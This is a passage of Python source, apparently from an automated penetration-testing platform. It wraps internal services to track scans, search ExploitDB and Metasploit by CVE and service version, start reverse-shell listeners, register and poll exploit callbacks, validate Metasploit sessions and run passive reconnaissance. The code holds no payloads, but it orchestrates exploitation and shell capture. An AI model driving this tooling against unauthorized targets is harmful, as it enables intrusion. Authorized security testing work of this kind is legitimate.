    return json.dumps(results, indent=2)


def get_session_scan_status(session_id: str = None) -> str:
    """
    Get the status of all scans associated with a pentest session.

    This provides a comprehensive overview of:
    - Session start time
    - Current phase of the pentest
    - Status of all related scans (masscan, nmap, nuclei, web_scan, playwright, udp)
    - Summary statistics

    Args:
        session_id: Optional session ID. If not provided, uses the current session context.

    Returns:
        JSON string with session scan status including:
        - session_id: The session identifier
        - started_at: When the session started
        - current_phase: Current phase of the pentest workflow
        - scans: List of all tracked scans with their status
        - summary: Aggregate statistics (total, completed, running, failed)

    Example response:
    {
        "session_id": "abc-123-uuid",
        "started_at": "2026-02-04T14:49:02Z",
        "current_phase": "PHASE 2 - SERVICE DETECTION",
        "scans": [
            {
                "type": "masscan",
                "job_id": "job-uuid",
                "status": "completed",
                "started_at": "...",
                "completed_at": "...",
                "duration_seconds": 45,
                "params": {"targets": ["192.168.1.150"], "ports": "<top-1000>"}
            },
            {
                "type": "nmap",
                "job_id": "job-uuid-2",
                "status": "running",
                "started_at": "...",
                "params": {"ip_address": "192.168.1.150", "ports": "21,22,80,443"}
            }
        ],
        "summary": {
            "total_scans": 2,
            "completed": 1,
            "running": 1,
            "failed": 0,
            "by_type": {
                "masscan": {"total": 1, "completed": 1, "running": 0},
                "nmap": {"total": 1, "completed": 0, "running": 1}
            }
        }
    }
    """
    # Get status from the tracker
    status = scan_tracker.get_session_status(session_id)

    # If we have tracked scans, enrich with live status from scanners
    if status.get("scans"):
        tools = get_scan_tools()
        for scan in status["scans"]:
            if scan["status"] == "running":
                # Try to get fresh status from the scanner service
                try:
                    job_id = scan["job_id"]
                    scan_type = scan["type"]

                    # Map scan types to their scanner service URLs
                    type_to_url = {
                        "masscan": tools.nmap_url,
                        "nmap": tools.nmap_url,
                        "udp": tools.nmap_url,
                        "full_scan": tools.nmap_url,
                        "smb_vuln": tools.nmap_url,
                        "credential_check": tools.nmap_url,
                        "web_scan": tools.web_scanner_url,
                        "nuclei": tools.nuclei_url,
                        "httpx": tools.pd_runner_url,
                        "naabu": tools.pd_runner_url,
                        "katana": tools.pd_runner_url,
                        "tlsx": tools.pd_runner_url,
                        "subfinder": tools.osint_runner_url,
                        "dnsx": tools.osint_runner_url,
                        "passive-recon": tools.osint_runner_url,
                        "recon-pipeline": tools.osint_runner_url,
                        "brutus": tools.brutus_runner_url,
                    }
                    service_url = type_to_url.get(scan_type)
                    if not service_url:
                        continue

                    if scan_type == "playwright":
                        resp = tools.client.get(f"{tools.playwright_url}/scan/{job_id}", timeout=5.0)
                    else:
                        resp = tools.client.get(f"{service_url}/jobs/{job_id}", timeout=5.0)

                    if resp.status_code == 200:
                        live_data = resp.json()
                        live_status = live_data.get("status", scan["status"])
                        scan["status"] = live_status
                        scan["progress"] = live_data.get("progress")

                        # Update tracker if status changed
                        if live_status in ("completed", "failed"):
                            result_summary = None
                            if live_status == "completed":
                                result_summary = {
                                    "ports_found": live_data.get("result", {}).get("ports_found"),
                                    "hosts_found": live_data.get("result", {}).get("hosts_found"),
                                    "vulnerabilities": live_data.get("result", {}).get("vulnerabilities_found"),
                                }
                            scan_tracker.update_scan_status(job_id, live_status, result_summary)

                except Exception as e:
                    scan["status_error"] = str(e)

    return json.dumps(status, indent=2, default=str)


# ===============================
# Enhanced Exploit Search & Listener Tools
# ===============================

def search_exploits_enhanced(
    query: str = None,
    cve: str = None,
    service: str = None,
    version: str = None,
    port: int = None,
    min_confidence: float = 0.3
) -> str:
    """
    Search for exploits using enhanced CVE/version-aware matching.

    This uses the enhanced RAG search which provides confidence scoring
    based on CVE match, service name match, and version compatibility.

    Args:
        query: Free-text search query
        cve: CVE identifier (e.g., 'CVE-2017-7494')
        service: Service name (e.g., 'samba', 'apache', 'ssh')
        version: Service version (e.g., '3.0.20', '2.4.41')
        port: Target port number for context
        min_confidence: Minimum confidence threshold (0.0-1.0)

    Returns:
        JSON string with matched exploits sorted by confidence score
    """
    tools = get_scan_tools()

    params = {}
    if query:
        params["query"] = query
    if cve:
        params["cve"] = cve
    if service:
        params["service"] = service
    if version:
        params["version"] = version
    if port:
        params["port"] = port

    result = tools._make_request(
        method="GET",
        url=f"{tools.scan_recommender_url}/rag/search/enhanced",
        operation=f"Enhanced exploit search (cve={cve}, service={service})",
        params=params
    )

    if "error" in result:
        return json.dumps(result, indent=2)

    # Filter by confidence
    filtered_exploitdb = [
        e for e in result.get("exploitdb", [])
        if e.get("confidence", 0) >= min_confidence
    ]
    filtered_metasploit = [
        e for e in result.get("metasploit", [])
        if e.get("confidence", 0) >= min_confidence
    ]

    result["exploitdb"] = filtered_exploitdb
    result["metasploit"] = filtered_metasploit
    result["total_matches"] = len(filtered_exploitdb) + len(filtered_metasploit)
    result["min_confidence_applied"] = min_confidence

    return json.dumps(result, indent=2)


def start_listener(
    port: int,
    listener_type: str = "nc",
    timeout: int = 300,
    pending_exploit_id: str = None
) -> str:
    """
    Start a reverse shell listener on the Kali listener service.

    Use this to catch callbacks from exploits that use reverse shells.

    Args:
        port: Port to listen on (must be between 9080-9180)
        listener_type: Type of listener ('nc' for netcat, 'socat' for socat)
        timeout: Listener timeout in seconds (default: 300 = 5 minutes)
        pending_exploit_id: UUID of pending exploit (for correlation)

    Returns:
        JSON string with listener details including ID
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.post(
            f"{kali_listener_url}/listeners/start",
            json={
                "port": port,
                "listener_type": listener_type,
                "timeout": timeout,
                "pending_exploit_id": pending_exploit_id
            },
            timeout=30.0
        )

        if response.status_code != 200:
            return json.dumps({
                "ok": False,
                "error": f"HTTP {response.status_code}",
                "detail": response.text[:500]
            }, indent=2)

        result = response.json()
        result["ok"] = True
        return json.dumps(result, indent=2)

    except httpx.ConnectError as e:
        return json.dumps({
            "ok": False,
            "error": "Cannot connect to kali-listener service",
            "detail": str(e),
            "hint": "Ensure the kali-listener container is running"
        }, indent=2)
    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def stop_listener(listener_id: str) -> str:
    """
    Stop a running listener.

    Args:
        listener_id: UUID of the listener to stop

    Returns:
        JSON string with stop result
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.post(
            f"{kali_listener_url}/listeners/{listener_id}/stop",
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def list_active_listeners() -> str:
    """
    List all active listeners.

    Returns:
        JSON string with list of active listeners
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.get(
            f"{kali_listener_url}/listeners",
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def get_listener_output(listener_id: str) -> str:
    """
    Get captured output from a listener (e.g., shell commands received).

    Args:
        listener_id: UUID of the listener

    Returns:
        JSON string with listener output
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.get(
            f"{kali_listener_url}/listeners/{listener_id}/output",
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def get_available_listener_port() -> str:
    """
    Get an available port for starting a listener.

    Returns:
        JSON string with available port number
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.get(
            f"{kali_listener_url}/ports/available",
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def register_callback(
    pending_exploit_id: str,
    listener_id: str,
    callback_type: str = "reverse_shell",
    validation_commands: List[str] = None
) -> str:
    """
    Register an expected callback for an exploit.

    This links a listener to a pending exploit so we can correlate
    incoming connections with exploit attempts.

    Args:
        pending_exploit_id: UUID of the pending exploit
        listener_id: UUID of the listener
        callback_type: Type of callback ('reverse_shell' or 'meterpreter')
        validation_commands: Commands to run for validation (default: whoami, id, hostname)

    Returns:
        JSON string with callback registration result
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    if validation_commands is None:
        validation_commands = ["whoami", "id", "hostname"]

    try:
        response = httpx.post(
            f"{kali_listener_url}/callbacks/register",
            json={
                "pending_exploit_id": pending_exploit_id,
                "listener_id": listener_id,
                "callback_type": callback_type,
                "validation_commands": validation_commands
            },
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def poll_callback(pending_exploit_id: str) -> str:
    """
    Check if a callback has been received for an exploit.

    Use this after executing an exploit to check if we got a shell.

    Args:
        pending_exploit_id: UUID of the pending exploit

    Returns:
        JSON string with callback status and validation results
    """
    kali_listener_url = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")

    try:
        response = httpx.get(
            f"{kali_listener_url}/callbacks/poll/{pending_exploit_id}",
            timeout=10.0
        )

        if response.status_code == 404:
            return json.dumps({
                "ok": True,
                "callback_received": False,
                "message": "No callback registered or received yet"
            }, indent=2)

        result = response.json()
        result["ok"] = True
        result["callback_received"] = result.get("validation_status") != "pending"
        return json.dumps(result, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def validate_msf_session(session_id: int) -> str:
    """
    Run validation commands on an active Metasploit session.

    This checks if we have a working shell and determines the access level.

    Args:
        session_id: Metasploit session ID

    Returns:
        JSON string with validation results including access level
    """
    exploit_runner_url = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")

    try:
        response = httpx.post(
            f"{exploit_runner_url}/sessions/{session_id}/validate",
            timeout=30.0
        )

        if response.status_code != 200:
            return json.dumps({
                "ok": False,
                "error": f"HTTP {response.status_code}",
                "detail": response.text[:500]
            }, indent=2)

        result = response.json()
        result["ok"] = True
        return json.dumps(result, indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


def list_msf_sessions() -> str:
    """
    List active Metasploit sessions.

    Returns:
        JSON string with list of active sessions
    """
    exploit_runner_url = os.environ.get("EXPLOIT_RUNNER_URL", "https://exploit-runner:8017")

    try:
        response = httpx.get(
            f"{exploit_runner_url}/sessions",
            timeout=10.0
        )

        return json.dumps(response.json(), indent=2)

    except Exception as e:
        return json.dumps({
            "ok": False,
            "error": str(e)
        }, indent=2)


# ===============================
# Passive Recon Wrapper Functions
# ===============================

def start_passive_recon(
    targets: str,
    scope_name: str = None,
    include_spider: bool = False,
    spider_depth: int = 2,
    include_cert_chain: bool = True,
    cert_chain_max_iterations: int = 2,
    proxy: str = None,
) -> str:
    """
    Start a passive-only recon pipeline (no port scans, no brute force, no vuln scanning).
    Chains: subfinder → dnsx → crtsh → httpx → tlsx → cert-chain → gau → katana → gowitness → whatweb.

    Args:
        targets: Comma-separated list of domains (e.g., "example.com,target.org")
        scope_name: Scope name for auto-adding discovered domains
        include_spider: Enable katana web crawling (default False)
        spider_depth: Katana crawl depth 1-5 (default 2)
        include_cert_chain: Enable cert serial chaining via crt.sh (default True)
        cert_chain_max_iterations: Max cert chain iterations 1-3 (default 2)
        proxy: SOCKS proxy URL (e.g., socks5://127.0.0.1:10120)

    Returns JSON string with job information.
    """
    if not targets:
        return json.dumps({"error": "No targets specified."})
    target_list = [t.strip() for t in targets.split(',')]
    osint_runner_url = os.environ.get("OSINT_RUNNER_URL", "https://osint-runner:8024")

    payload = {
        "targets": target_list,
        "include_spider": include_spider,
        "spider_depth": spider_depth,
        "include_cert_chain": include_cert_chain,
        "cert_chain_max_iterations": cert_chain_max_iterations,
    }
    if scope_name:
        payload["scope_name"] = scope_name
    if proxy:
        payload["proxy"] = proxy

    try:
        response = httpx.post(
            f"{osint_runner_url}/jobs/passive-recon",
            json=payload,
            timeout=30.0,
        )
        result = response.json()
        job_id = result.get("job_id")
        if job_id:
            scan_tracker.track_scan("passive-recon", job_id, {"targets": target_list})
            result["next_step"] = (
                f"Passive recon started with job_id='{job_id}'. "
                f"Call wait_for_job_completion(job_id='{job_id}', job_type='passive-recon') to wait."
            )
        return json.dumps(result, indent=2)
    except Exception as e:
        return json.dumps({"ok": False, "error": str(e)}, indent=2)


def get_passive_recon_plan(
    targets: str,
    scope_name: str = None,
    include_spider: bool = False,
    spider_depth: int = 2,
    include_cert_chain: bool = True,
) -> str:
    """
    Get the execution plan for a passive recon pipeline without running it.

    Args:
        targets: Comma-separated list of domains
        scope_name: Scope name (for planning context)
        include_spider: Whether spider would be included
        include_cert_chain: Whether cert chaining would be included

    Returns JSON string with the planned phases.
    """
    if not targets:
        return json.dumps({"error": "No targets specified."})
    target_list = [t.strip() for t in targets.split(',')]
    osint_runner_url = os.environ.get("OSINT_RUNNER_URL", "https://osint-runner:8024")

    payload = {
        "targets": target_list,
        "include_spider": include_spider,
        "spider_depth": spider_depth,
        "include_cert_chain": include_cert_chain,
        "plan_only": True,
    }
    if scope_name:
        payload["scope_name"] = scope_name

    try:
        response = httpx.post(
            f"{osint_runner_url}/jobs/passive-recon",
            json=payload,
            timeout=15.0,
        )
        return json.dumps(response.json(), indent=2)
    except Exception as e:
        return json.dumps({"ok": False, "error": str(e)}, indent=2)
